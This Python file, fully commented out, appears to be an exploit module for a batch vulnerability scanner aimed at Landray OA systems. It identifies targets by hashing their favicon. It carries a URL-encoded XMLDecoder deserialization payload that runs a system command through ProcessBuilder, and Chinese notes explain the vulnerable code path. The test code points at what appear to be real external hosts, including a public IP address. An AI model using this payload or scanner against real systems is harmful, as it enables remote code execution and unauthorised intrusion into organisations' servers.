# # coding=utf-8
# # @Author   : zpchcbd HG team
# # @Time     : 2021-09-19 18:24
# import base64
# import hashlib
# import re
#
# from colorama import Fore
# from tqdm import tqdm
#
# from exploit.web import BaseScript
# from core.MyEnums import *
# from core.request.asynchttp import *
#
# # app="Landray-OA系统"
# # python batch.py -m exploit.web.OA.Landray.unauth_ssrf -cs -fs "app=\"Landray-OA系统\""
# class Script(BaseScript):
#     name = 'Landray'
#
#     def __init__(self, target, pbar):
#         super().__init__()
#         # 漏洞目标
#         self.target = target
#         # 漏洞等级
#         self.bugLevel = BugLevel.HIGH
#         # 类型
#         self.bugType = BugType.WRITEFILE
#         # 编号
#         self.bugNumber = 'https://github.com/YinWC/2021hvv_vul/blob/master/0409/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5.md'
#         # 来源
#         self.refer = 'https://github.com/mhaskar/XMLDecoder-payload-generator'
#         # 特定路径判断
#         self.detectPathList = ['/favicon.ico']
#         # exec
#         self.execPathList = ['/sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=%3c%3fxml+version%3d%221.0%22+encoding%3d%22UTF-8%22%3f%3e+%3cjava+version%3d%221.7.0_21%22+class%3d%22java.beans.XMLDecoder%22%3e%3cvoid+class%3d%22java.lang.ProcessBuilder%22%3e+%3carray+class%3d%22java.lang.String%22+length%3d%221%22%3e%3cvoid+index%3d%220%22%3e%3cstring%3ewhoami%3c%2fstring%3e%3c%2fvoid%3e%3c%2farray%3e+%3cvoid+method%3d%22start%22+id%3d%22process%22%3e+%3c%2fvoid%3e+%3c%2fvoid%3e+%3c%2fjava%3e']
#         # 进度条
#         self.pbar = pbar
#         # 相关信息
#         self.info = ''
#         self.favicon = ['302464c3f6207d57240649926cfc7bd4']
#
#     async def detect(self):
#         try:
#             '''
#             /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode]
#             漏洞在/sys/search/sys_search_main/sysSearchMain.do method 为 editrParam。
#             参数为 FdParameters，在 com.landray.kmss.sys.search.jar 中的 com.landray.kmss.sys.search.actions.SysSearchMainAction 类。method 为 editrParam。
#             对 fdParemNames 的内容进行了判空。如果不为空,进入 SysSearchDictUtil.getParamConditionEntry 方法。
#             也是对 fdParemNames 进行了一次判空。然后传入 ObjectXML.objectXMLDecoderByString 方法。 将传入进来的 string 字符进行替换。
#             将其载入字节数组缓冲区，在传递给 objectXmlDecoder。 在 objectXmlDecoder 中。就更明显了。典型的 xmlDecoder 反序列化。
#             整体流程只对 FdParameters 的内容进行了一些内容替换。 导致 xmlDecoder 反序列化漏洞。
#             利用方式： Xmldecoder payload 生成 https://github.com/mhaskar/XMLDecoder-payload-generator
#             '''
#             async with aiohttp.ClientSession() as session:
#                 for detectPath in self.detectPathList:
#                     url = f'http://{self.target}{detectPath}' if self.target.startswith(
#                         ('http:', 'https:')) is False else f'{self.target}{detectPath}'
#                     async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
#                         if response is not None:
#                             text = await response.read()
#                             await asyncio.sleep(2)
#                             m1 = hashlib.md5()
#                             m1.update(text)
#                             theMD5 = m1.hexdigest()
#                             for _ in self.favicon:
#                                 if _ == theMD5:
#                                     self.flag = True
#                                     tqdm.write(Fore.RED + '[{}] {}'.format('Landray Finger', url))
#                                     return {'name': 'Landray Finger', 'url': url, 'software': 'Landray'}
#         except Exception:
#             return None
#
#     # async def exec(self):
#     #     try:
#     #         async with aiohttp.ClientSession() as session:
#     #             for execPath in self.execPathList:
#     #                 url = f'http://{self.target}{execPath}' if self.target.startswith(
#     #                     ('http:', 'https:')) is False else f'{self.target}{execPath}'
#     #                 async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
#     #                     if response is not None:
#     #                         async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response1:
#     #                             pass
#     #     except Exception:
#     #         return None
#
#     async def attack(self, semaphore):
#         async with semaphore:
#             a = await self.detect()
#             if a is not None:
#                 self.vulList.append(a)
#             if self.flag:
#                 b = await self.exec()
#                 if b is not None:
#                     self.vulList.append(b)
#         self.pbar.update(1)
#         return self.vulList
#
#
# if __name__ == '__main__':
#     import requests
#     import hashlib
#
#     resp = requests.get('http://kms.biad.com.cn/favicon.ico', verify=False)
#     if resp.status_code == 200:
#         m1 = hashlib.md5()
#         m1.update(resp.content)
#         theMD5 = m1.hexdigest()
#         print(theMD5)
#     #
#     # semaphore = asyncio.Semaphore(500)
#     # sc = Script('61.150.65.205:9999', 1)
#     # l = asyncio.get_event_loop()
#     # l.run_until_complete(sc.attack(semaphore))
